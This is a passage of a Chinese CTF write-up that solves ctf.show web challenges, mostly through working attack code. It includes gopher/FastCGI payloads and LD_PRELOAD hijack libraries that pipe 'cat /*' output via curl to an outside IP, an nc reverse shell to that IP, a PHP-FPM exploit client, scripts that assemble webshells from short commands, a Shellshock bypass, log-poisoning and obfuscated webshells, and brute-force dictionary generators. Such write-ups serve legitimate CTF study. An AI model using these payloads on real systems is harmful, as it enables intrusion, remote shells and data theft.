conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()

```

之后利用gopherus生成payload

![image-20231120145210406](assets/image-20231120145210406.png)

```php
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.115.219.82%3A443%3Fa%3D%60cat%20/%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

vps监听443端口
 payload

```php
?file=ftp://x.x.x.x:80&content=gopherus生成的payload(只取下划线后面的内容，且不需要再次编码)

?file=ftp://47.115.219.82:80&content=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27curl%20http%3A//47.115.219.82%3A443%3Fa%3D%60cat%20/%2A%60%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```



## web812(**SSRF打PHP-FPM未授权**)

**PHP-FPM未授权**

```python
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php system("cat /flagfile"); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=28163, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))
```

```shell
python2/3 fpm.py -c '<?php system("cat /f*");?>' -p 28046 pwn.challenge.ctf.show /usr/local/lib/php/System.php

//脚本要在linux下使用，windows中报错：
error: unrecognized arguments: /usr/local/lib/php/System.php
```

![image-20231120153618420](assets/image-20231120153618420.png)

## web814（劫持getuid）

```
<?php
error_reporting(0);

$action = $_GET['a'];
switch ($action) {
    case 'phpinfo':
        phpinfo();
        break;
    
    case 'write':
        file_put_contents($_POST['file'],$_POST['content']);
        break;

    case 'run':
        putenv($_GET['env']);
        system("whoami");
        break;

    default:
        highlight_file(__FILE__);
        break;
```

劫持**getuid**

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload(){
        system("curl http://url:port?s=`cat /*`");
}
int getuid()
{
        if(getenv("LD_PRELOAD")==NULL){ return 0;}
        unsetenv("LD_PRELOAD");
        payload();
}



gcc -c -fPIC hack.c -o hack&&gcc --share hack -o hack.so


import requests
url="http://43af8270-3d9e-416a-8fdb-d1fc1115715b.challenge.ctf.show/"
data={'file':'/tmp/hack.so','content':open('hack.so','rb').read()}
requests.post(url+'?a=write',data=data)
requests.get(url+'?a=run&env=LD_PRELOAD=/tmp/hack.so')
```

## web815

```php
 <?php
error_reporting(0);

$action = $_GET['a'];
switch ($action) {
    case 'phpinfo':
        phpinfo();
        break;
    
    case 'write':
        file_put_contents($_POST['file'],$_POST['content']);
        break;

    case 'run':
        putenv($_GET['env']);
        mail("","","","");
        break;

    default:
        highlight_file(__FILE__);
        break;
} 
```

继续劫持，有点像贵阳那个劫持方法，在正常代码执行之前执行我们的恶意代码

```php
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
extern char** environ;

__attribute__ ((__constructor__)) void hack(void)
{
unsetenv("LD_PRELOAD");
system("curl http://url:port?s=`cat /*`");
}
gcc -c -fPIC hack.c -o hack&&gcc --share hack -o hack.so
import requests
url="http://03e18d36-ea33-478b-8ab2-506f67fb4e3b.challenge.ctf.show/"
data={'file':'/tmp/hack.so','content':open('hack.so','rb').read()}
requests.post(url+'?a=write',data=data)
requests.get(url+'?a=run&env=LD_PRELOAD=/tmp/hack.so')
```

## web816

```
<?php
error_reporting(0);

$env = $_GET['env'];
if(isset($env)){
    putenv($env.scandir("/tmp")[2]);
    system("echo ctfshow");
}else{
    highlight_file(__FILE__);
}
```

有点像虎符ctf的ezphp，还是劫持，不过这里我们不能直接上传文件了，可以用临时文件打，hack.so用上题那个

```
import requests
url="http://6f1fba1f-43b2-45c8-a34f-cc9c995cde9e.challenge.ctf.show/?env=LD_PRELOAD=/tmp/"
files={'file':open('hack.so','rb').read()}
response=requests.post(url,files=files)
```

## web817（利用nginx的body/fastcgi缓存机制）

```php
$file = $_GET['file'];
if(isset($file) && preg_match("/^\/(\w+\/?)+$/", $file)){//以/开头，并且后面只能有数字字母和/
	shell_exec(shell_exec("cat $file"));

}
```

首先这里限制了只能为/字母数字的file，所以不能用日志，一眼顶针虎符ezphp，文件描述/proc/pid/fd/xxx可能存在web日志

让后端 php 请求一个过大的文件
当body过大时，导致 Nginx 需要产生临时文件进行缓存
虽然Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件
遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI，vps监听端口，修改脚本中的ip+端口，运行即可得到flag

```php
import  threading, requests
import socket
import re
port= 28106
s=socket.socket()
s.connect(('pwn.challenge.ctf.show',port))
s.send(f'''GET / HTTP/1.1
Host:127.0.0.1

	'''.encode())
data=s.recv(1024).decode()
s.close()
pid = re.findall('(.*?) www-data',data)[0].strip()
print(pid)

con="curl http://url:port?a=`cat /f*`;"+'0'*1024*500
l = len(con)
def upload():
	while True:
		s=socket.socket()
		s.connect(('pwn.challenge.ctf.show',port))
		x=f'''POST / HTTP/1.1
Host: 127.0.0.1
Content-Length: {l}
Content-Type: application/x-www-form-urlencoded
Connection: close

{con}

		'''.encode()
		s.send(x)
		s.close()

def bruter():
	while True:
		for fd in range(3,40):
			print(fd)
			s=socket.socket()
			s.connect(('pwn.challenge.ctf.show',port))
			s.send(f'''GET /?file=/proc/{pid}/fd/{fd} HTTP/1.1
Host: 127.0.0.1
Connection: close

'''.encode())
			print(s.recv(2048).decode())
			s.close()


for i in range(30):
    t = threading.Thread(target=upload)
    t.start()
for j in range(30):
    a = threading.Thread(target=bruter)
    a.start()
```

## web818

不知道是不是因为大一对虎符ctf ezphp印象太深刻了，感觉每个劫持题都像它

```php
$env = $_GET['env'];
if(isset($env)){
	putenv($env);
	system("echo ctfshow");
}else{
	system("ps aux");
}
```

可以说和那个题一模一样了，hack.so用之前那个就行了

```python
# coding: utf-8

import urllib.parse
import  threading, requests
import socket
import re
port= 28107
s=socket.socket()
s.connect(('pwn.challenge.ctf.show',port))
s.send(f'''GET / HTTP/1.1
Host:127.0.0.1

	'''.encode())
data=s.recv(1024).decode()
s.close()
pid = re.findall('(.*?) www-data',data)[0].strip()
print(pid)
l=str(len(open('hack.so','rb').read()+b'\n'*1024*200)).encode()
def upload():
	while True:
		s=socket.socket()
		s.connect(('pwn.challenge.ctf.show',port))	
		x=b'''POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: yu22x
Content-Length: '''+l+b'''
Content-Type: application/x-www-form-urlencoded
Connection: close

'''+open('hack.so','rb').read()+b'\n'*1024*200+b'''

'''
		s.send(x)
		s.close()

def bruter():
	while True:
		for fd in range(3,40):
			print(fd)
			s=socket.socket()
			s.connect(('pwn.challenge.ctf.show',port))
			s.send(f'''GET /?env=LD_PRELOAD=/proc/{pid}/fd/{fd} HTTP/1.1
Host: 127.0.0.1
User-Agent: yu22x
Connection: close

'''.encode())
			print(s.recv(2048).decode())
			s.close()


for i in range(30):
    t = threading.Thread(target=upload)
    t.start()
for j in range(30):
    a = threading.Thread(target=bruter)
    a.start()
```

## web819(修复后的破壳漏洞绕过)

```php
<?php
$env = $_GET['env'];
if(isset($env)){  
putenv($env);  
system("whoami");
}
else{  
highlight_file(__FILE__);
}
```

这里简单总结下
 破壳漏洞本来是可以这样使用
 `env=hack=() { :; }; ls`
 类似于创建了一个函数，而函数体外的内容可以执行。

爆出之后做了修复：修复内容如下

![image-20231120162011867](assets/image-20231120162011867.png)

这样的话，因为php代码后面又执行了whoami命令，所以可以自己创建一个whoami函数，而函数体中执行我们想用的命令。

```php
?env=BASH_FUNC_whoami%%=() { cat /f*;}
?env=BASH_FUNC_whoami%%=() { ls /;}
```

## web820（非常规图片马上传）

```php
 <?php
error_reporting(0);

if(strlen($_FILES['file']['tmp_name'])>0){
    $filetype = $_FILES['file']['type'];
    $tmpname = $_FILES['file']['tmp_name'];
    $ef = getimagesize($tmpname);

    if( ($filetype=="image/jpeg") && ($ef!=false) && ($ef['mime']=='image/jpeg')){
        $content = base64_decode(file_get_contents($tmpname));
        file_put_contents("shell.php", $content);
        echo "file upload success!";
    }
}else{
    highlight_file(__FILE__);
} 
```

会将我们上传的图片base64解码后写入到shell.php中，base64中是4位4位进行解码的，所以我们要在正常的图片加上一句话木马base64编码后的数据，然后因为不知道多少位解码，我们要加上1补码，就一个一个试，一个1不行就两个1，我PD9前面那几个1就是补码

先搞个图片马

```php
<?php eval($_POST[1]); phpinfo();?> 
//base64 编码一下：
PD9waHAgZXZhbCgkX1BPU1RbMV0pOyBwaHBpbmZvKCk7Pz4=
```

![img](assets/1-14-1024x615.png)

## web821（7字符RCE）

```php
<?php
highlight_file(__FILE__);

$cmd = $_POST['cmd'];

if(strlen($cmd) <= 7){
    shell_exec($cmd);
}
```

预备知识：

>a    #虽然没有输入但是会创建a这个文件
>ls -t    #ls基于基于事件排序（从晚到早）
>sh a    #sh会把a里面的每行内容当作命令来执行
>使用|进行命令拼接    #l\ s    =    ls
>base64    #使用base64编码避免特殊字符

写入语句：

```
<?php eval($_GET[1]);
```

base64编码后

```cobol
PD9waHAgZXZhbCgkX0dFVFsxXSk7
```

需要被执行的语句：

```
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php
```

payload：

```shell
>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0
```

脚本代码：

```
<?php eval($_GET[1]);
```



```python
# -*- coding: utf-8 -*-
import requests
import time

url = ""

payload=[
">hp",
">1.p\\",
">d\\>\\",
">\\ -\\",
">e64\\",
">bas\\",
">7\\|\\",
">XSk\\",
">Fsx\\",
">dFV\\",
">kX0\\",
">bCg\\",
">XZh\\",
">AgZ\\",
">waH\\",
">PD9\\",
">o\\ \\",
">ech\\",
"ls -t>0",
". 0"
]
def writeFile(payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)

def run():
	for p in payload:
		writeFile(p.strip())
		print("[*] create "+p.strip())
		time.sleep(1)

def check():
	response = requests.get(url+"1.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"1.php")

def main():
	run()
	check()

if __name__ == '__main__':
	main()
```

之后执行/1.php?1=phpinfo();

如果想蚁剑链接

利用脚本可以插入木马文件
 这里需要用get进行蚁剑连接

```bash
http://a5efc927-2331-4a26-9c31-248e9b58a782.challenge.ctf.show/1.php?1=eval($_POST[1]);
```

## web822（7字符RCE不可写，上传临时文件到可写目录，用.执行）

```php
<?php
#flag in database;
error_reporting(0);
highlight_file(__FILE__);

$cmd = $_POST['cmd'];

if(strlen($cmd) <= 7){
    shell_exec($cmd);
}
```

本题目在web目录不可写,于是需要另一种方法
 写到临时目录并执行它
 (**.表示执行一个sh脚本，使本身没有执行权限的脚本通过点可以执行，如果没要会报错**)
 payload

```php
import requests

url = "http://a3a1edce-d6f3-4336-b393-95c84c19f1b0.challenge.ctf.show/"
file={'file':b"nc 47.115.219.82 80 -e /bin/sh"}
data={'cmd':'. /t*/*'}//刚好7字符
test = requests.post(url=url,data=data,files=file)
```

之后在反弹回来的shell中，用mysql -uroot -proot 链接数据库，读取数据即可得到flag。

## web823（5字符可写，有dir）

```php
<?php
#flag in database;
error_reporting(0);
highlight_file(__FILE__);

$cmd = $_POST['cmd'];
if(strlen($cmd) <= 5){
    shell_exec($cmd);
}
?>
```

*可以将文件名作为命令进行执行

![image-20231120172214261](assets/image-20231120172214261.png)

最好将脚本中的5字符命令自己敲一下
 如果压缩包里面有php命令可以直接php进行运行
 利用脚本

```pyhon
# -*- coding: utf-8 -*-

import requests
import time

url = "http://77e86d43-d65b-4635-8230-9214d4463ff2.challenge.ctf.show/"
url_2 = url+".php"
delay = 0.3

chagneFile_payload=[
'>cp',
'>k',
'*',
'rm cp',
'>pc',
'>dir',
'*>v',
'>rev',
'*v>z',
'sh z',
'rm v',
'rm k',
'rm z',
'rm pc',
'rm *v',
'>php.',
'>j\\#',
'>vm',
'*>v',
'>rev',
'*v>z',
'sh z'
]

clearFile_payload=[
'rm d*',
'rm j*',
'rm p*',
'rm r*',
'rm v*',
'rm z'
]

shell_payload=[
'>tar',
'>vcf',
'>z'
]

file={
	'file':b'<?php file_put_contents("1.php","<?php eval(\\$_POST[1]);?>");?>'
}


def changeFile():
	for p in chagneFile_payload:
		sendPayload(url,p)
		print("[*] create "+p.strip())
		time.sleep(delay)

def clearFile():
	for p in clearFile_payload:
		sendPayload(url_2,p)
		print("[*] create "+p.strip())
		time.sleep(delay)

def getshell():
	for p in shell_payload:
		sendPayload(url_2,p)
		print("[*] create "+p.strip())
		time.sleep(delay)
	data={
		"cmd":"* /t*"
	}
	requests.post(url_2,data=data,files=file)
	data={
		"cmd":"php z"
	}
	requests.post(url_2,data=data)

def checkShell():
	response = requests.get(url+"1.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"1.php")

def sendPayload(url,payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)



def run():
	changeFile()
	clearFile()
	getshell()
	checkShell()

def main():
	run()

if __name__ == '__main__':
	main()
```

## web825（4字符，可写，有dir）

```php
<?php
#flag in database;
error_reporting(0);
highlight_file(__FILE__);

$cmd = $_POST['cmd'];
if(strlen($cmd) <= 4){
    shell_exec($cmd);
}
?>
```

本题主要就是构造ls -t
 可以利用

```
'>sl',
'>kt-',
'>j\\>',
'>j\\#',
'>dir',
'*>v',
'>rev',
'*v>x',
```

进行构造ls -t > x中

 之后执行x就行

 脚本

```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-05-06 13:25:41
# @Last Modified by:   h1xa
# @Last Modified time: 2022-05-10 20:55:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests
import time

url = ""

payload = [
'>sl',
'>kt-',
'>j\\>',
'>j\\#',
'>dir',
'*>v',
'>rev',
'*v>x',
'>php',
'>a.\\',
'>\\>\\',
'>-d\\',
'>\\ \\',
'>64\\',
'>se\\',
'>ba\\',
'>\\|\\',
'>4=\\',
'>Pz\\',
'>k7\\',
'>XS\\',
'>sx\\',
'>VF\\',
'>dF\\',
'>X0\\',
'>gk\\',
'>bC\\',
'>Zh\\',
'>ZX\\',
'>Ag\\',
'>aH\\',
'>9w\\',
'>PD\\',
'>S}\\',
'>IF\\',
'>{\\',
'>\\$\\',
'>ho\\',
'>ec\\',
'sh x',
'sh j'
]

def writeFile(payload):
	data={
	"cmd":payload
	}
	requests.post(url,data=data)

def run():
	for p in payload:
		writeFile(p.strip())
		print("[*] create "+p.strip())
		time.sleep(0.3)

def check():
	response = requests.get(url+"a.php")
	if response.status_code == requests.codes.ok:
		print("[*] Attack success!!!Webshell is "+url+"a.php")

def main():
	run()
	check()

if __name__ == '__main__':
	main()
```



# 0x0E 黑盒测试

https://blog.csdn.net/miuzzx/article/details/112522873

## web380（目录扫描，猜测包含）

目录扫描发现：page.php、flag.php两个文件

![image-20231121093516756](assets/image-20231121093516756.png)

访问flag.php,无内容，访问page.php,发现：

![image-20231121093601057](assets/image-20231121093601057.png)

猜测根据传参id,拼接包含文件，于是尝试GET传参?id=flag，来包含刚才看不到源码的flag.php,得到flag

![image-20231121093803223](assets/image-20231121093803223.png)

## web381(读源码找后台地址)

page.php已经无法文件包含

看源码有一个可疑的路径

CTFshow刷题日记-WEB-黑盒测试（web380-395）文件包含、日志包含getshell、SQL注入_mysql_05

访问这个目录，最后注意一定要带上/

![image-20231121094627382](assets/image-20231121094627382.png)



## web382-383(弱口令加万能密码)

上题的/alsckdfy/目录访问之后是个登录界面

burp抓包爆破就行了，p字段，这些都可以拿到flag

![image-20231121094853779](assets/image-20231121094853779.png)



## web384-(字典生成，爆破密码)

提示：密码前2位是小写字母，后三位是数字

这肯定是后台密码了，而账户先盲猜admin

抓包使用intruder模块暴力破解(使用集束炸弹)

position只要有两个变量就可以

第一个变量-两位小写的英文字母

![image-20231121100100660](assets/image-20231121100100660.png)

第二个变量-三位数字

![image-20231121100111436](assets/image-20231121100111436.png)

爆破得到密码xy123,登陆即可

也可以用脚本来生成字典：

```python
LENGTH = 5 # 密码最大长度
charLength = 2 # 字母最大长度
char = 'qwertyuiopasdfghjklzxcvbnm' # 字母列表

##补足LENGTH位的数字字符串  eg. 1->001，12->012

def formatNum(n):
    global LENGTH
    return '0' * (LENGTH - charLength - len(str(abs(n)))) + str(abs(n))[:LENGTH-charLength]

string = ''

for n in char:
    for c in char:
        for i in range(pow(10, LENGTH - charLength)):
            string += n + c + formatNum(i) + '\n'

with open('dict_2L3d.txt','w') as f:
    f.write(string)

```

或

```python
import string
s1=string.ascii_lowercase
s2=string.digits
f=open('dict.txt','w')
for i in s1:
	for j in s1:
		for k in s2:
			for l in s2:
				for m in s2:
					p=i+j+k+l+m
					f.write(p+"\n")
f.close()

```

## web385(重装漏洞)

按照惯例还是先扫描目录，这里扫描到了 /install，猜测应该是初始化网站后，初始化页面没有删去或者隐藏

![image-20231121101010814](assets/image-20231121101010814.png)

![image-20231121101028723](assets/image-20231121101028723.png)



重置为初始密码，一般都很是很简单的弱口令，之后寻找后台，如上面一样，在前端代码里发现后台地址：/alsckdfy/

访问：猜测管理员用户名：admin，进行弱口令爆破，得到密码：admin888,登录得到flag

## web386(任意文件删除+重装漏洞)

通过扫描后台发现clear.php和install

![image-20231121102925458](assets/image-20231121102925458.png) 

访问install

![image-20231121102950594](assets/image-20231121102950594.png)

访问clear.php直接显示清理完成

盲猜一波file参数,删个index.php试试，?file=/var/www/html/index.php

![image-20231121103220740](assets/image-20231121103220740.png)

那直接把lock.dat删了,lock.dat在linstall下

![image-20231121103242154](assets/image-20231121103242154.png)

剩下的就是上一题的重复了。访问install/?install初始化账号密码,然后admin admin888登录

## web383~386通解(利用 file_get_contents() 函数的特性)

我们可以利用 file_get_contents() 函数的这个特性

    hint.php?/…/…/…/flag.php
    
    hint.php?这个目录不存在，但仍能够往上跳转4级目录，去包含flag.php

file_get_contents()函数的参数格式为：

    file_get_contents('page_'.$id.'.php')

payload：

```php
url/page.php?id=1/../../../../var/www/html/alsckdfy/check
#flag在check.php里
```



## web387（日志文件包含，执行php代码）

目录扫描：发现robots.txt

![image-20231121103559492](assets/image-20231121103559492.png)

访问发现：/debug路径

访问/debug,发现提示文件不存在，那就给个file参数试试：

![image-20231121103732892](assets/image-20231121103732892.png)

任意文件包含了

尝试日志文件包含试试，发现可以成功file=/var/log/nginx/access.log

![image-20231121104731303](assets/image-20231121104731303.png)

再尝试直接在UA头写马，包含日志

![image-20231121104703162](assets/image-20231121104703162.png)

这种方法会报错，而且这是文件包含，写shell也不好传参，不如直接执行命令

写入phpinfo();访问发现是执行了的

![image-20231121105852020](assets/image-20231121105852020.png)

**方法一：删除文件锁登录后台**

![image-20231121105925637](assets/image-20231121105925637.png)

```
<?php unlink('/var/www/html/install/lock.dat')?>
```

再去访问/install/?install重新安装，然后登录后台

**方法二：执行命令读取文件**

访问日志文件写入命令，访问的同时命令也就执行了

```
<?php system('ls /var/www/html > /var/www/html/1.txt');?>
```

![image-20231121110016836](assets/image-20231121110016836.png)

再去访问生成的文件

![image-20231121110030303](assets/image-20231121110030303.png)

flag在alsckdfy/check.php

同样先去包含日志文件同时执行命令

![image-20231121110051944](assets/image-20231121110051944.png)



## web388（无回显加免杀马）

debug访问已经变成了一句提示

![image-20231121110813034](assets/image-20231121110813034.png)

### 方式一：编辑器上传

回到后台目录alsckdfy找线索，爆破目录发现/alsckdfy/editor/目录，是一个文本编辑器，并且存在文件上传点，可以上传图片、zip、rar、html、ppt等一些文件

![CTFshow刷题日记-WEB-黑盒测试（web380-395）文件包含、日志包含getshell、SQL注入_ctf_24](assets/resize,m_fixed,w_1184.webp)

因为允许上传zip文件，写个一句话把后缀改为zip即可

```php
<?php
$a = '<?ph'.'p ev'.'al($_PO'.'ST[1]);?>';
file_put_contents('/var/www/html/1.php',$a);
?>
//起到免杀效果
```

上传zip一句话木马

![image-20231121110904084](assets/image-20231121110904084.png)

上传成功后会提示上传的路径

再去包含文件/debug/?file=/var/www/html/alsckdfy/attached/file/20211006/20211006093704_45260.zip

![image-20231121110926490](assets/image-20231121110926490.png)

此时文件内容已经被读取写入日志了，再去包含日志文件/debug/?file=/var/log/nginx/access.log，写入的shell就执行了，生成1.php，访问执行拿到flag

![image-20231121110947129](assets/image-20231121110947129.png)

### 方法二：包含日志写入shell

ua就是一句话木马，最好是免杀的一句话

![image-20231121111059753](assets/image-20231121111059753.png)

然后再访问一次/debug/?file=/var/log/nginx/access.log，就会生成shell

![image-20231121111112920](assets/image-20231121111112920.png)

脚本一键化：

```python
import requests
import base64
url="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/"
url2="http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log"
cmd=b"<?php eval($_POST[1]);?>"
cmd=base64.b64encode(cmd).decode()
headers={
	'User-Agent':'''<?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''.format(cmd)
}
print(headers)
requests.get(url=url,headers=headers)
requests.get(url2)
print(requests.post(url+'b.php',data={'1':'system("cat alsckdfy/check.php");'}).text)
```



web389（伪造jwt）
-----------------------------------

